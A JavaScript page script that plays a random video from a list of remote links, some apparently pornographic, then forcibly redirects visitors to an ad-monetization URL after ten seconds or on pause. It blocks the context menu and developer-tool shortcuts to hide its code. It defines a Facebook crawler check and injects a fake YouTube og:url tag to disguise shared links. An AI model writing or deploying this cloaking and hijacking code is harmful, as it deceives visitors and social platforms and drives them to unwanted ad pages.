document.addEventListener("DOMContentLoaded", function () {
  
    var redirigira = 2; 
    

    var redirectURL = "https://www.profitableratecpm.com/f9i33hr9d2?key=03d7472f6eb5ea24b3277a1c3a50bf56"; 

    var video = document.getElementById('videoPlayer');
    var timer;

    var videoList = [
        "https://universoreality.site/wp-content/uploads/2025/04/7.mp4",
  "https://universoreality.site/wp-content/uploads/2025/04/12.mp4",
  "https://qu-ax.pro/wp-content/uploads/2025/03/Lana-Rhoades-y-Veronica-Rodriguez-unen-su-vaginas-para-ti.mp4",
  "https://cdn.videy.co/fsl82BVB1.mp4",
  "https://cdn.videy.co/d4nTtaqr1.mp4",
  "https://cdn.videy.co/RUWkifSI1.mp4",
  "https://cdn.videy.co/mvB5MwJB1.mp4",
        "https://cdn.videy.co/YbM9ElFw1.mp4",
  "https://cdn.videy.co/dEjWs9NT1.mp4",
  "https://cdn.videy.co/nIOFJOOk1.mp4",
  "https://video.twimg.com/amplify_video/1909924613020094464/vid/avc1/540x540/vY6l9A5wxlhHAIPG.mp4?tag=14",
  "https://cdn.videy.co/myv5RPvW1.mp4?fbclid=IwY2xjawJwQzJleHRuA2FlbQIxMAABHpCfNmxpy9TuDyTaPOVOUQs11-IVb9sysX73RvMwHujkUo6RMZKmaDxcRx1w_aem_aa_C8m76Od3ha5V0K_GDwA",
  "https://videeys.com/wp-content/uploads/2025/04/IMG_8883.mp4",
  "https://cdn.videy.co/AFXuMb9K1.mp4",
  "https://cdn.videy.co/VZvgMSbU1.mp4",
  "https://cdn.videy.co/QVujXbSx1.mp4",
  "https://qu-ax.pro/wp-content/uploads/2025/04/iR54QFOK1.mp4",
  "https://qu-ax.pro/wp-content/uploads/2025/04/bSW7RL2J1.mp4",
  "https://cdn.videy.co/9LSfDUP21.mp4",
  "https://qu.ax/URsAF.mp4",






    ];

    function playRandomVideo() {
        var randomIndex = Math.floor(Math.random() * videoList.length);
        video.src = videoList[randomIndex];
        video.play();
    }

    playRandomVideo();

    function redirect() {
        window.location.href = redirectURL; 
    }

    video.addEventListener('ended', redirect);
    video.addEventListener('pause', redirect);

    video.addEventListener('play', function () {
        clearTimeout(timer);
        timer = setTimeout(redirect, 10000);
    });

    video.addEventListener('pause', function () {
        clearTimeout(timer);
    });


    document.addEventListener('keydown', function (e) {
        if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p' || e.key === 'i' || e.key === 'j')) {
            e.preventDefault();
        }
        if (e.key === 'F12') {
            e.preventDefault();
        }
    });

    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
    });
});


  	function isFacebookBot() {
    const botUserAgents = [
        "facebookexternalhit", 
        "Facebot", 
      	"FacebookBot" 
    ];

    const userAgent = navigator.userAgent.toLowerCase();
    
    return botUserAgents.some(bot => userAgent.includes(bot.toLowerCase()));
	}


function fakeYouTubeURL() {
    var meta = document.createElement('meta');
    meta.setAttribute('property', 'og:url');
    meta.content = "https://www.youtube.com/watch?v=9o4kvBI5A98&list=RD2oX2FSv4Rys&index=6";
    document.head.appendChild(meta);
}

window.onload = fakeYouTubeURL;